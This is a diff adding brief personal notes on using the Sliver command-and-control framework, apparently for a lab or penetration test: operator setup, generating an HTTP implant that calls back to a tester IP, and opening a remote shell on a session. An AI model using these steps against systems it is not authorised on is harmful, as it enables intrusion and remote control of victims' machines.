@@ -1,0 +1,21 @@
+Configure (tester pc):
+    sudo sliver-server
+    multiplayer
+    new-operator -n name -s /tmp/ -l 192.168.56.101
+    [cfg file is now at -s /...cfg]
+
+    sliver-client import /path/to/.cfg
+    sliver-client [and choose tester host]
+    
+    parameterize payload
+        https
+        generate --os x --name first --http TESTER_IP_ADDR
+        implants [view generated implants]
+
+    useful things
+        jobs
+        --skip symbols [generate without obfuscation]
+        sessions [list open sessions]
+        use xx [first 2 of session ID]
+        info
+        shell
